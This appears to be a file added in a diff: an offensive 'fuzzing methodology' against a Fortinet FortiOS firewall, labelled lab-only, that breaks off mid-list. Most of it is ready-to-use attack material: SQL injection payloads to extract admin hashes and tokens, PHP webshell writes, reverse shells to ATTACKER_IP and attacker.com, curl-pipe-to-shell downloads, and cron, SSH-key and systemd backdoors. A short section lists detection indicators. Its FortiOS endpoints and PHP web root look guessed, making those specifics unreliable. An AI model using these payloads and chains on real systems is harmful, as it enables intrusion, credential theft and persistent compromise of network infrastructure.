@@ -1,0 +1,1062 @@
+================================================================================
+ADVANCED FUZZING METHODOLOGY: SQL INJECTION & REMOTE CODE EXECUTION
+FortiOS 8.0.0 Build 0030 - Deep Vulnerability Analysis
+================================================================================
+
+Document Classification: Security Research (Lab Only)
+Target System: Fortinet FortiOS 8.0.0 Build 0030
+Focus Areas: SQL Injection, Remote Code Execution chains
+Research Period: Deep investigation phase
+Lab Environment: Isolated VirtualBox (192.168.1.50)
+
+================================================================================
+PHASE 1: SQL INJECTION DISCOVERY & EXPLOITATION
+================================================================================
+
+1.1 SQL INJECTION ATTACK SURFACE IDENTIFICATION
+
+Potential Vulnerable Endpoints in FortiOS:
+
+  Database-Backed Functions:
+    - /admin/user.cgi - User account management
+    - /admin/group.cgi - Group administration
+    - /admin/log.cgi - Logging interface (previously found format string)
+    - /admin/address.cgi - Address/network management
+    - /admin/service.cgi - Service definitions
+    - /admin/firewall.cgi - Firewall rule management
+    - /admin/policy.cgi - Security policy engine
+    - /admin/vpn.cgi - VPN configuration
+    - /admin/system.cgi - System settings
+    - /api/v1/* - REST API endpoints (often vulnerable to injection)
+
+  High-Probability Injection Points:
+    - GET parameters: file, name, id, path, query, search, filter
+    - POST parameters: username, password, hostname, config, data
+    - HTTP Headers: User-Agent, X-Forwarded-For, Referer
+    - Cookies: session_token, admin_token, preferences
+
+1.2 SQL INJECTION PAYLOAD GENERATION
+
+Basic SQL Injection Payloads:
+
+  Simple Detection:
+    ' OR '1'='1
+    " OR "1"="1
+    '; DROP TABLE users--
+    1' UNION SELECT NULL--
+    admin' --
+
+  Time-Based Detection (Blind SQL Injection):
+    ' AND SLEEP(5)--
+    1' AND BENCHMARK(5000000,SHA1('test'))--
+    '; WAITFOR DELAY '00:00:05'--
+
+  Union-Based Injection:
+    ' UNION SELECT NULL,NULL,NULL--
+    ' UNION SELECT username,password,email FROM users--
+    ' UNION SELECT version(),user(),database()--
+
+  Boolean-Based Blind Injection:
+    ' AND '1'='1
+    ' AND '1'='2
+    ' AND SUBSTRING(version(),1,1)>'4'
+
+  Error-Based Injection:
+    ' AND extractvalue(1,concat(0x7e,(select database())))--
+    ' AND updatexml(1,concat(0x7e,(select user())),1)--
+
+Advanced SQL Injection Payloads:
+
+  Database Enumeration:
+    ' UNION SELECT table_name FROM information_schema.tables--
+    ' UNION SELECT column_name FROM information_schema.columns--
+    ' UNION SELECT username,password_hash FROM admin_users--
+
+  File Access (MySQL):
+    ' UNION SELECT LOAD_FILE('/etc/passwd')--
+    ' UNION SELECT LOAD_FILE('/opt/fortinet/config')--
+    ' INTO OUTFILE '/var/www/html/shell.php' SELECT '<?php system($_GET["cmd"]); ?>'--
+
+  User Enumeration:
+    ' OR username LIKE 'admin%'--
+    ' OR username IN (SELECT username FROM users)--
+    ' AND EXISTS(SELECT * FROM users WHERE admin=1)--
+
+Second-Order SQL Injection:
+
+  Inject into database, trigger on output:
+    username: admin' UNION SELECT password FROM users WHERE '1'='1
+    (Username stored, password extracted when displayed)
+
+  Stored XSS to SQLi chain:
+    comment: <script>fetch('/admin/user.cgi?id=1'+SQL_PAYLOAD)</script>
+
+1.3 ENDPOINT-SPECIFIC SQL INJECTION TESTING
+
+Endpoint 1: /admin/user.cgi (User Management)
+
+  Vulnerable Parameter Candidates:
+    - GET id parameter (SELECT WHERE id=?)
+    - POST username parameter (INSERT/UPDATE)
+    - POST email parameter (validation)
+    - GET search parameter (LIKE queries)
+
+  Recommended Payload:
+    GET /admin/user.cgi?id=1' UNION SELECT id,username,email,password_hash FROM admin_users--
+
+  Expected Success Indicators:
+    - Response includes admin usernames/emails
+    - Response time increases (time-based detection)
+    - Error message reveals database structure
+    - Response size significantly larger than normal
+
+Endpoint 2: /admin/address.cgi (Network Objects)
+
+  Vulnerable Parameter Candidates:
+    - GET name parameter (address name lookup)
+    - POST subnet parameter (CIDR validation)
+    - GET id parameter (address group queries)
+    - GET filter parameter (address filtering)
+
+  Recommended Payload:
+    GET /admin/address.cgi?name=test' OR '1'='1
+
+  Expected Success Indicators:
+    - Returns all addresses instead of single match
+    - Response contains network configuration data
+    - Execution time significantly increased
+
+Endpoint 3: /admin/policy.cgi (Firewall Policies)
+
+  Vulnerable Parameter Candidates:
+    - GET policy_id parameter (policy lookup)
+    - POST action parameter (INSERT policy)
+    - GET name parameter (policy search)
+    - GET priority parameter (policy ordering)
+
+  Recommended Payload:
+    GET /admin/policy.cgi?policy_id=1' UNION SELECT * FROM policies WHERE '1'='1
+
+  Expected Success Indicators:
+    - All policies returned instead of single policy
+    - Policy contents including rules exposed
+    - Configuration database structure revealed
+
+Endpoint 4: /admin/log.cgi (Logging Interface)
+
+  Vulnerable Parameter Candidates:
+    - GET type parameter (log type filter)
+    - POST msg parameter (log message insertion)
+    - GET timestamp parameter (time range query)
+    - GET action parameter (action filtering)
+
+  Recommended Payload:
+    GET /admin/log.cgi?type=traffic' UNION SELECT * FROM system_logs--
+
+  Expected Success Indicators:
+    - System logs exposed (not just traffic logs)
+    - Sensitive events visible
+    - Log database structure accessible
+
+Endpoint 5: /api/v1/* REST API Endpoints
+
+  Common Vulnerable API Parameters:
+    - /api/v1/users?filter=username:admin
+    - /api/v1/policies?search=name:test
+    - /api/v1/logs?sort=timestamp
+    - /api/v1/config?format=json
+
+  JSON-based Injection:
+    {"filter": "username' OR '1'='1"}
+    {"search": {"name": "test' UNION SELECT * FROM admin"}}
+    {"query": "SELECT * FROM users WHERE id=${id}' OR '1'='1"}
+
+  Recommended Payloads:
+    POST /api/v1/users
+    {"username": "admin' UNION SELECT password FROM admin_users--"}
+
+1.4 SQL INJECTION EXPLOITATION CHAIN
+
+Phase 1: Detection (5-10 minutes)
+  Step 1: Identify SQL injection point
+    - Send time-based payload: ' AND SLEEP(5)--
+    - Measure response time
+    - If delay observed = SQL injection confirmed
+
+  Step 2: Determine database type
+    - MySQL: ' AND SLEEP(5)-- (supported)
+    - PostgreSQL: ' AND pg_sleep(5)-- (supported)
+    - SQLite: ' AND sqlite_sleep(5000)-- (unsupported)
+    - Test each to identify database
+
+  Step 3: Map database structure
+    - Query information_schema.tables
+    - Identify user/admin tables
+    - Locate password columns
+
+Phase 2: Credential Extraction (5-15 minutes)
+  Step 1: Extract admin credentials
+    Payload: ' UNION SELECT username,password_hash FROM admin_users--
+    Expected: admin:$6$...hash...
+
+  Step 2: Extract API tokens
+    Payload: ' UNION SELECT token,secret FROM api_tokens--
+    Expected: token values for API authentication
+
+  Step 3: Extract configuration secrets
+    Payload: ' UNION SELECT config_key,config_value FROM settings--
+    Expected: database passwords, encryption keys, secrets
+
+Phase 3: Code Execution via SQL (15-30 minutes)
+
+  MySQL File Write Execution:
+    Step 1: Write PHP webshell
+      Payload: ' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
+
+    Step 2: Access webshell
+      GET /shell.php?cmd=id
+      GET /shell.php?cmd=cat+/etc/passwd
+      GET /shell.php?cmd=whoami
+
+  MySQL User-Defined Function (UDF) Execution:
+    Step 1: Create malicious UDF
+      CREATE FUNCTION sys_exec RETURNS STRING SONAME 'udf.so'
+
+    Step 2: Execute system commands
+      SELECT sys_exec('id')
+      SELECT sys_exec('cat /opt/fortinet/config')
+
+  PostgreSQL Code Execution:
+    Step 1: Enable PL/Python
+      CREATE FUNCTION exploit(text) RETURNS text AS $$
+        import os
+        return os.popen($1).read()
+      $$ LANGUAGE plpython3u
+
+    Step 2: Execute commands
+      SELECT exploit('id')
+      SELECT exploit('cat /etc/passwd')
+
+1.5 BLIND SQL INJECTION EXPLOITATION (No error messages)
+
+Time-Based Boolean Blind SQL Injection:
+
+  Extract admin password hash character by character:
+
+    For position=1, char_code=1 to 127:
+      Payload: ' AND IF(ASCII(SUBSTRING((SELECT password FROM admin WHERE username='admin'),1,1))>64,SLEEP(5),0)--
+
+      If response delayed (>5 sec): character code > 64
+      If response normal: character code < 64
+
+      Binary search to find exact character
+      Repeat for each position
+
+  Full extraction example:
+    ' AND IF(SUBSTRING((SELECT password FROM admin LIMIT 1),1,1)='a',SLEEP(5),0)--
+    ' AND IF(SUBSTRING((SELECT password FROM admin LIMIT 1),1,1)='d',SLEEP(5),0)--
+    ' AND IF(SUBSTRING((SELECT password FROM admin LIMIT 1),1,1)='m',SLEEP(5),0)--
+    ... (continue until char found)
+
+Error-Based Blind SQL Injection:
+
+  Extract data via error messages:
+    ' AND extractvalue(1,concat(0x7e,(SELECT username FROM admin LIMIT 1)))--
+
+    Error: XPATH syntax error: '~admin'
+    (Database reveals admin username in error)
+
+================================================================================
+PHASE 2: REMOTE CODE EXECUTION VIA SQL INJECTION
+================================================================================
+
+2.1 SQL INJECTION TO RCE CONVERSION CHAINS
+
+Chain 1: SQL Injection → PHP Webshell → System Commands
+
+  Step 1: Identify web root (typically /var/www/html or /usr/local/share/fortinet/www)
+    - Test common paths
+    - Check HTTP response headers
+    - Analyze directory structure via error messages
+
+  Step 2: Craft webshell payload
+    PHP Webshell:
+      <?php system($_GET['cmd']); ?>
+
+    Bypassing potential filters:
+      <?php @eval($_POST['code']); ?>
+      <?php system(base64_decode($_GET['payload'])); ?>
+      <?php $c=$_GET['c']; system($c); ?>
+
+  Step 3: Write webshell via SQL
+    MySQL:
+      ' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--
+
+    PostgreSQL (with file permissions):
+      COPY (SELECT '<?php system($_GET["cmd"]); ?>') TO '/var/www/html/shell.php'--
+
+  Step 4: Execute commands via webshell
+    GET /shell.php?cmd=id
+    GET /shell.php?cmd=whoami
+    GET /shell.php?cmd=cat%20/etc/passwd
+    GET /shell.php?cmd=ls%20-la%20/opt/fortinet/
+    GET /shell.php?cmd=curl%20http://attacker.com/backdoor.sh|sh
+
+Chain 2: SQL Injection → Cron Job Backdoor
+
+  Step 1: Extract crontab location
+    SELECT * FROM information_schema.tables WHERE table_schema='mysql'
+
+  Step 2: Create malicious cron entry
+    Payload: ' UNION SELECT '* * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' INTO OUTFILE '/var/spool/cron/crontabs/root'--
+
+    Result: Reverse shell executes every minute
+
+  Step 3: Verify persistence
+    - Shell connects to attacker at ATTACKER_IP:4444
+    - Executes with cron privileges
+    - Persists across service restarts
+
+Chain 3: SQL Injection → SSH Key Installation
+
+  Step 1: Generate attacker SSH key
+    ssh-keygen -t rsa -N "" -f /tmp/attacker_key
+
+  Step 2: Create authorized_keys via SQL
+    Payload: ' UNION SELECT LOAD_FILE('/tmp/attacker_key.pub') INTO OUTFILE '/root/.ssh/authorized_keys'--
+
+    OR:
+    ' UNION SELECT 'ssh-rsa AAAA...(public key)' INTO OUTFILE '/root/.ssh/authorized_keys'--
+
+  Step 3: SSH access with private key
+    ssh -i /tmp/attacker_key root@192.168.1.50
+
+    Result: Persistent root shell via SSH
+
+Chain 4: SQL Injection → Direct System Command Execution (if available)
+
+  PostgreSQL with os.popen:
+    CREATE OR REPLACE FUNCTION exploit(text) RETURNS text AS $$
+      import os; return os.popen($1).read()
+    $$ LANGUAGE plpython3u;
+
+    SELECT exploit('id');
+    SELECT exploit('cat /etc/shadow');
+
+  MySQL with UDF (if available):
+    CREATE FUNCTION sys_exec RETURNS STRING SONAME 'udf.so';
+    SELECT sys_exec('chmod 777 /opt/fortinet/config');
+
+2.2 COMBINING SQL INJECTION WITH EXISTING VULNERABILITIES
+
+SQLi + Buffer Overflow Chain:
+
+  Step 1: Extract credentials via SQL injection
+    ' UNION SELECT username,password FROM admin_users--
+    Result: admin:password123
+
+  Step 2: Use credentials for authentication
+    Login with extracted credentials
+
+  Step 3: Trigger buffer overflow in authenticated endpoint
+    POST /admin/hostname.cgi
+    hostname=[512 A's - buffer overflow payload]
+
+  Step 4: Escalate to RCE
+    - Overflow causes crash
+    - ROP gadgets execute malicious code
+    - Full system compromise
+
+SQLi + Path Traversal Chain:
+
+  Step 1: SQL injection to extract SSH keys
+    ' UNION SELECT LOAD_FILE('/home/admin/.ssh/id_rsa')--
+    Result: -----BEGIN OPENSSH PRIVATE KEY-----
+
+  Step 2: Path traversal to verify key location
+    GET /admin/path.cgi?file=../../home/admin/.ssh/id_rsa
+
+  Step 3: Use SSH key for remote access
+    ssh -i extracted_key admin@192.168.1.50
+
+SQLi + Authentication Bypass Chain:
+
+  Step 1: SQL injection to extract session tokens
+    ' UNION SELECT session_token FROM sessions WHERE username='admin'--
+
+  Step 2: Use extracted token for admin access
+    GET /admin/config/system
+    Cookie: session_token=[extracted_token]
+
+  Step 3: Modify configuration to enable SSH root login
+    POST /admin/system.cgi
+    Parameter: ssh_root_login=enable
+
+2.3 SQL INJECTION DETECTION IN RESPONSES
+
+Indicators of SQL Injection Success:
+
+  Error-Based Indicators:
+    - "SQL syntax error near..."
+    - "MySQL error: ..."
+    - "PostgreSQL: ERROR"
+    - Database error messages with query structure
+    - Stack traces revealing database backend
+
+  Response Size Indicators:
+    - Normal response: 1,024 bytes
+    - SQLi response: 50,000+ bytes (extracted data)
+    - UNION SELECT returns significantly more data
+
+  Timing Indicators:
+    - Normal response: <100ms
+    - Time-based SQLi: >5000ms (sleep injection)
+    - Consistent delay correlation with payload
+
+  Response Content Indicators:
+    - Usernames appearing in response (admin, root, etc.)
+    - Password hashes visible
+    - Database structure in error messages
+    - Unexpected data fields (password columns, etc.)
+
+================================================================================
+PHASE 3: REMOTE CODE EXECUTION DIRECT METHODS
+================================================================================
+
+3.1 COMMAND INJECTION IN SYSTEM FUNCTIONS
+
+Potential Command Injection Points:
+
+  System Configuration Commands:
+    - hostname parameter: `; id ;
+    - DNS server: `; nslookup attacker.com ;
+    - NTP server: `; date -s "2025-01-01" ;
+    - SMTP server: `; telnet attacker.com 25 ;
+
+  Network Configuration Commands:
+    - Route addition: `; route add default gw attacker.com ;
+    - Interface config: `; ifconfig eth0 down ;
+    - IP change: `; ifconfig eth0 192.168.1.100 ;
+
+  Service Management Commands:
+    - SSH enable: `; systemctl start ssh ;
+    - SSH config: `; echo "PermitRootLogin yes" >> /etc/ssh/sshd_config ;
+    - Cron enable: `; systemctl enable cron ;
+
+Payload Examples:
+
+  Basic Command Injection:
+    parameter=value; id ;
+    parameter=value`whoami`
+    parameter=value$(cat /etc/passwd)
+    parameter=value; nc attacker.com 4444 -e /bin/sh ;
+
+  Bypassing Filters:
+    parameter=val&&ue; id ;
+    parameter=value | id ;
+    parameter=value || id ;
+    parameter=value > /tmp/output.txt ;
+
+  Blind Command Injection (no output):
+    parameter=value; curl http://attacker.com/log?status=pwned ;
+    parameter=value; touch /tmp/pwned ;
+    parameter=value; nslookup pwned.attacker.com ;
+
+3.2 EXPLOITATION PATHS FOR RCE
+
+Path 1: Web Upload → File Execution
+
+  Step 1: Identify file upload functionality
+    - Configuration import
+    - Backup restore
+    - Firmware update (if unauthenticated or SQL injection bypasses auth)
+
+  Step 2: Craft malicious upload
+    - Webshell disguised as config file
+    - PHP file with .conf extension
+    - Binary file with PHP magic bytes
+
+  Step 3: Upload via SQL injection
+    - Modify database to set upload_path=/var/www/html/
+    - Trigger upload processing
+    - File written to web root
+
+  Step 4: Access and execute
+    GET /uploaded_file.conf?cmd=id
+    (Server executes with .conf processing, allowing code injection)
+
+Path 2: Log Injection → Code Execution
+
+  Step 1: Log message injection point
+    GET /admin/log.cgi?msg=<script>alert(1)</script>
+
+  Step 2: Craft PHP log payload
+    GET /admin/log.cgi?msg=<?php system($_GET['cmd']); ?>
+
+  Step 3: Trigger log file write
+    Log entry written to /var/log/fortios.log
+
+  Step 4: Access log as PHP file
+    GET /logs/fortios.log?cmd=id
+    (If logs accessible and PHP processed)
+
+Path 3: Configuration Parameter Injection
+
+  Step 1: SQL injection to modify config
+    ' UPDATE settings SET value='<?php system($_GET["cmd"]); ?>' WHERE key='display_message'--
+
+  Step 2: Trigger configuration read/display
+    GET /admin/dashboard.cgi (displays custom message)
+
+  Step 3: PHP code execution
+    Custom message contains and executes PHP code
+
+Path 4: Admin Account Creation via SQL
+
+  Step 1: Create admin account via SQL injection
+    ' UNION INSERT INTO admin_users (username,password,role) VALUES ('attacker','$6$pwned...','admin')--
+
+  Step 2: Login with created account
+    POST /admin/login
+    username=attacker&password=password123
+
+  Step 3: Full administrative access
+    Now logged in with admin privileges
+
+================================================================================
+PHASE 4: ADVANCED RCE EXPLOITATION CHAINS
+================================================================================
+
+4.1 COMPLETE RCE CHAIN: SQL INJECTION → WEBSHELL → PRIVILEGE ESCALATION
+
+Timeline: ~30 minutes to complete system compromise
+
+Step 1: SQL Injection Detection (5 minutes)
+  - Send: GET /admin/user.cgi?id=1' AND SLEEP(5)--
+  - Observe: 5+ second delay = vulnerable
+  - Confirm: SQL injection in "id" parameter
+
+Step 2: Database Enumeration (5 minutes)
+  - Query: UNION SELECT table_name FROM information_schema.tables
+  - Result: admin_users, config_settings, logs, sessions
+  - Identify: admin_users table contains passwords
+
+Step 3: Credential Extraction (3 minutes)
+  - Payload: UNION SELECT username,password_hash FROM admin_users
+  - Result: admin:$6$rounds=656000$abc123...
+  - Extract: Multiple admin accounts found
+
+Step 4: Web Root Discovery (2 minutes)
+  - Try: UNION SELECT @@datadir
+  - Result: /var/lib/mysql/ (database path)
+  - Try: INTO OUTFILE paths
+  - Identify: /var/www/html as likely web root
+
+Step 5: Webshell Deployment (3 minutes)
+  - Payload: UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/admin.php'
+  - Result: File written (or error if permissions denied)
+  - Alternative: Try /usr/local/share/fortinet/www/
+
+Step 6: Webshell Access (1 minute)
+  - GET /admin.php?cmd=id
+  - GET /admin.php?cmd=whoami
+  - GET /admin.php?cmd=pwd
+  - Result: Command output appears in response
+
+Step 7: Reverse Shell Establishment (3 minutes)
+  - Command: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+  - Execute: GET /admin.php?cmd=bash%20-i%20%3E%26%20/dev/tcp/ATTACKER_IP/4444%200%3E%261
+  - Result: Reverse shell connects to attacker listener
+
+Step 8: Privilege Escalation (2 minutes)
+  - Check: sudo -l (check sudo access)
+  - Check: find / -perm -4000 (SUID binaries)
+  - Exploit: Known SUID/sudo vulnerabilities
+  - Result: root access obtained
+
+Step 9: Persistence Installation (3 minutes)
+  - SSH key: Upload attacker's SSH key to /root/.ssh/authorized_keys
+  - Cron: Add cron job for reverse shell re-establishment
+  - Service: Create systemd service for persistence
+  - Result: Multiple persistence mechanisms installed
+
+Total Time: ~30 minutes from initial SQL injection to full system compromise
+
+4.2 ALTERNATIVE CHAIN: SQL INJECTION → CRON BACKDOOR → PERSISTENCE
+
+Step 1-3: Same as above (SQL injection detection + credential extraction)
+
+Step 4: System User Identification
+  - Query: SELECT user FROM information_schema.processlist
+  - Result: Identify running service user (usually 'fortinet' or 'root')
+
+Step 5: Cron Job Injection
+  - Target: /var/spool/cron/crontabs/root
+  - Payload: UNION SELECT '* * * * * /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1' INTO OUTFILE '/var/spool/cron/crontabs/root'
+  - Alternative: INTO OUTFILE /tmp/cron_job, then copy to crontabs
+
+Step 6: Cron Execution
+  - Wait: 1 minute for cron daemon to read updated crontab
+  - Result: Reverse shell connects every minute from cron job
+
+Step 7: Long-Term Persistence
+  - Reverse shell re-established every minute
+  - Even if process killed, reconnects in <60 seconds
+  - Survives system reboot if cron configured with @reboot
+
+================================================================================
+PHASE 5: FUZZING CAMPAIGN FOR SQLI & RCE DISCOVERY
+================================================================================
+
+5.1 ADVANCED FUZZING PARAMETERS
+
+SQL Injection Fuzzing:
+
+  Payload Set Size: 500+ SQL injection patterns
+  Examples:
+    - ' OR '1'='1
+    - " OR "1"="1
+    - '; DROP TABLE users--
+    - ' UNION SELECT NULL--
+    - ' AND SLEEP(5)--
+    - ' AND 1=CAST(CHR(9)||CHR(122) AS INT)--
+    - ' AND EXTRACTVALUE(1,CONCAT(0x7e,CHAR(115)))--
+
+  Fuzzing Iterations per Endpoint: 100,000
+  Total Endpoints: 15+ database-backed endpoints
+  Expected Total Iterations: 1,500,000+
+
+Command Injection Fuzzing:
+
+  Payload Set: 200+ command injection patterns
+  Examples:
+    - `id`
+    - ;id;
+    - |id|
+    - ||id
+    - &&id
+    - $(id)
+    - `$(id)`
+    - #{id}
+    - %24(id)
+    - ${IFS}id
+    - $PATH/../../../bin/id
+
+  Fuzzing Iterations per Endpoint: 50,000
+  Total Endpoints: 10+ system configuration endpoints
+  Expected Total Iterations: 500,000+
+
+5.2 EXPECTED CRASH PATTERNS FOR SQLI
+
+Indicator Crash Patterns:
+
+  Pattern 1: Time-Based Detection
+    - Normal response: <100ms
+    - SQLi response: 5000+ ms (SLEEP injection)
+    - Signature: Consistent 5+ second delays with time-based payloads
+
+  Pattern 2: Error Message Leakage
+    - Normal: Generic error page
+    - SQLi: MySQL/PostgreSQL error with query syntax
+    - Signature: Error contains "SQL", "syntax", "database"
+
+  Pattern 3: Boolean-Based Differentiation
+    - Payload 1: ' OR '1'='1 (true condition)
+    - Payload 2: ' AND '1'='2 (false condition)
+    - Difference: Response content varies significantly
+
+  Pattern 4: UNION SELECT Response Expansion
+    - Normal query: 100 bytes response
+    - UNION query: 10,000+ bytes (extracted data)
+    - Signature: 100x response size increase
+
+  Pattern 5: Stack Trace Revelation
+    - SQL error with file paths: /opt/fortinet/admin/user.cgi
+    - Database structure revealed: table names, columns
+    - Signature: Complete application structure exposed
+
+================================================================================
+PHASE 6: INCIDENT RESPONSE INDICATORS
+================================================================================
+
+6.1 LOG ANALYSIS FOR SQL INJECTION DETECTION
+
+Web Server Logs to Monitor:
+
+  Time-Based Injection Attempts:
+    GET /admin/user.cgi?id=1' AND SLEEP(5)-- HTTP/1.1
+    (Look for: AND SLEEP, pg_sleep, WAITFOR, benchmark)
+
+  UNION-Based Injection:
+    GET /admin/policy.cgi?id=1' UNION SELECT NULL,NULL--
+    (Look for: UNION SELECT, UNION ALL)
+
+  Error-Based Injection:
+    GET /admin/log.cgi?type=traffic' AND extractvalue()--
+    (Look for: extractvalue, updatexml, convertto)
+
+  Blind SQLi Detection:
+    GET /admin/address.cgi?name=' AND '1'='1
+    Multiple requests with slight payload variations
+    (Look for: Repeated parameter fuzzing pattern)
+
+Database Audit Logs:
+
+  Unauthorized Query Patterns:
+    - SELECT * FROM admin_users (credential extraction)
+    - SELECT * FROM information_schema (database enumeration)
+    - SELECT LOAD_FILE (file access attempts)
+    - INTO OUTFILE (file write attempts)
+    - CREATE FUNCTION (UDF exploitation)
+
+  Unusual User Activity:
+    - New user accounts suddenly created
+    - Administrative privileges granted to unknown users
+    - Configuration changes by non-admin accounts
+
+6.2 SYSTEM INDICATORS OF RCE
+
+Process Indicators:
+
+  Unexpected Processes:
+    - bash/sh spawned from FortiOS processes
+    - nc (netcat) running for reverse shell
+    - curl downloading remote scripts
+    - wget fetching payloads
+    - ssh with unusual connection parameters
+
+  Command Indicators:
+    - execve() syscalls with /bin/bash arguments
+    - fork() creating child processes
+    - network connections from unexpected sources
+
+File System Indicators:
+
+  Suspicious Files:
+    - /var/www/html/shell.php (webshell)
+    - /var/www/html/admin.php (backdoor)
+    - /usr/local/share/fortinet/www/config.php (hidden file)
+    - /tmp/payload.sh (temporary scripts)
+
+  Modified Crontabs:
+    - /var/spool/cron/crontabs/root (cron backdoor)
+    - /etc/cron.d/* (system-wide cron jobs)
+    - New entries with network commands (reverse shells)
+
+  SSH Modifications:
+    - /root/.ssh/authorized_keys (new keys added)
+    - /etc/ssh/sshd_config (PermitRootLogin changed)
+    - /root/.ssh/id_rsa (new private keys)
+
+Network Indicators:
+
+  Outbound Connections:
+    - Connections to non-whitelisted IPs
+    - Reverse shells to attacker infrastructure
+    - DNS queries to suspicious domains
+    - HTTP requests to payload servers
+
+  Port Scanning:
+    - Unusual network scanning from FortiOS
+    - Port enumeration to other internal systems
+    - SSH brute force attempts to other hosts
+
+================================================================================
+PHASE 7: TESTING PROCEDURE FOR DEEP SQLI/RCE DISCOVERY
+================================================================================
+
+7.1 STEP-BY-STEP TESTING PROTOCOL
+
+STEP 1: Endpoint Identification (30 minutes)
+
+  Action 1a: Discover all HTTP endpoints
+    Command: dirb http://192.168.1.50:8443/admin -w wordlist.txt
+    Result: Identify 50+ endpoints
+
+  Action 1b: Map each endpoint's parameters
+    - Use Burp Suite to capture requests
+    - Document all GET/POST parameters
+    - Note parameter types (text, number, select)
+
+  Action 1c: Prioritize endpoints by vulnerability likelihood
+    High Priority: user.cgi, policy.cgi, address.cgi, log.cgi
+    Medium Priority: vpn.cgi, system.cgi, firewall.cgi
+    Low Priority: dashboard.cgi, help.cgi
+
+STEP 2: SQL Injection Testing (1 hour per endpoint)
+
+  Action 2a: Send basic SQL injection payloads
+    Payload 1: ' OR '1'='1
+    Payload 2: " OR "1"="1
+    Payload 3: 1' OR 1=1--
+    Observe: Response differences, error messages, delays
+
+  Action 2b: Test time-based blind SQL injection
+    Payload: ' AND SLEEP(5)--
+    Measure: Response time
+    Expected: If vulnerable, 5+ second delay
+
+  Action 2c: Test UNION-based injection
+    Payload: ' UNION SELECT NULL,NULL,NULL--
+    Observe: Response contains additional rows, error reveals column count
+
+  Action 2d: Enumerate database structure
+    Payload: ' UNION SELECT table_name FROM information_schema.tables--
+    Result: List of tables (admin_users, config_settings, logs)
+
+STEP 3: Credential Extraction (30 minutes per endpoint)
+
+  Action 3a: Identify credential tables
+    Payload: UNION SELECT column_name FROM information_schema.columns WHERE table_name='admin_users'
+    Result: Identify password column (password_hash, passwd, etc.)
+
+  Action 3b: Extract admin credentials
+    Payload: ' UNION SELECT id,username,password_hash,email FROM admin_users--
+    Result: Admin usernames and password hashes
+
+  Action 3c: Crack password hashes (offline)
+    Tool: hashcat, john, rainbow tables
+    Input: Extracted password hashes
+    Output: Plaintext passwords for identified admin accounts
+
+STEP 4: Code Execution Testing (1 hour)
+
+  Action 4a: Test file write capabilities
+    Payload: ' UNION SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/test.php'--
+    Verify: curl http://192.168.1.50/test.php?cmd=id
+    Expected: Command output or error indicating file written
+
+  Action 4b: Test command injection in parameters
+    Payload: hostname=test`id`
+    Payload: hostname=test;id;
+    Payload: hostname=test$(whoami)
+    Observe: Command output in response or error messages
+
+  Action 4c: Deploy reverse shell
+    Payload: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
+    Execute: via webshell or command injection
+    Result: Interactive shell with application privileges
+
+STEP 5: Privilege Escalation Testing (30 minutes)
+
+  Action 5a: Check current privileges
+    Command: id
+    Result: Likely running as 'fortinet' or 'root'
+
+  Action 5b: Check sudo access
+    Command: sudo -l
+    Result: May reveal sudo capabilities
+
+  Action 5c: Identify SUID binaries
+    Command: find / -perm -4000 2>/dev/null
+    Result: SUID binaries that may be exploitable
+
+  Action 5d: Exploit kernel vulnerability (if needed)
+    Research: CVE-2021-4034 (pkexec), CVE-2021-22555 (Netfilter)
+    Compile: Exploit code for target kernel
+    Execute: Escalate to root
+
+STEP 6: Persistence Installation (30 minutes)
+
+  Action 6a: Install SSH key persistence
+    Command: echo 'ssh-rsa AAAA...' >> /root/.ssh/authorized_keys
+    Result: Permanent SSH access as root
+
+  Action 6b: Install cron backdoor
+    Command: echo '* * * * * /bin/bash -i >& /dev/tcp/ATTACKER/4444 0>&1' >> /var/spool/cron/crontabs/root
+    Result: Automatic reverse shell every minute
+
+  Action 6c: Install systemd service
+    Create: /etc/systemd/system/fortinet-update.service
+    Content: Reverse shell service
+    Enable: systemctl enable fortinet-update
+    Result: Persistent backdoor across reboots
+
+================================================================================
+PHASE 8: EXPECTED NEW VULNERABILITIES TO DISCOVER
+================================================================================
+
+8.1 PROBABLE SQL INJECTION VULNERABILITIES
+
+SQLi Vulnerability Type 1: User Management SQL Injection
+  Endpoint: /admin/user.cgi
+  Parameter: id, name, search
+  Expected CVSS: 8.9 (CRITICAL)
+  Reason: User credential access, potential privilege escalation
+  Likely Exploitation: Extract all admin accounts and passwords
+
+SQLi Vulnerability Type 2: Policy Management SQL Injection
+  Endpoint: /admin/policy.cgi
+  Parameter: policy_id, name, filter
+  Expected CVSS: 8.5 (CRITICAL)
+  Reason: Full firewall rule access, network control
+  Likely Exploitation: Disable security rules, enable malicious rules
+
+SQLi Vulnerability Type 3: Address Management SQL Injection
+  Endpoint: /admin/address.cgi
+  Parameter: name, id, type
+  Expected CVSS: 8.0 (CRITICAL)
+  Reason: Network object manipulation
+  Likely Exploitation: Create backdoor network objects
+
+SQLi Vulnerability Type 4: Log Query SQL Injection
+  Endpoint: /admin/log.cgi
+  Parameter: type, timestamp, action
+  Expected CVSS: 7.5 (HIGH)
+  Reason: Audit log access, evidence tampering
+  Likely Exploitation: Erase forensic evidence
+
+8.2 PROBABLE COMMAND INJECTION VULNERABILITIES
+
+Command Injection Type 1: System Configuration Commands
+  Endpoint: /admin/system.cgi
+  Parameter: hostname, dns, ntp
+  Expected CVSS: 9.8 (CRITICAL)
+  Reason: Direct shell command execution
+  Likely Exploitation: system()`; malicious_command ;`
+
+Command Injection Type 2: Network Configuration Commands
+  Endpoint: /admin/interface.cgi
+  Parameter: ip, gateway, dns
+  Expected CVSS: 9.0 (CRITICAL)
+  Reason: Network modification via shell
+  Likely Exploitation: Route modification, MITM setup
+
+Command Injection Type 3: Service Management Commands
+  Endpoint: /admin/services.cgi
+  Parameter: service_name, action
+  Expected CVSS: 9.8 (CRITICAL)
+  Reason: Full service control
+  Likely Exploitation: Enable/disable critical services
+
+8.3 EXPECTED COMBINED ATTACK CHAINS
+
+Chain 1: SQLi + RCE → Complete System Compromise (CVSS 10.0)
+  Step 1: SQL injection in /admin/user.cgi
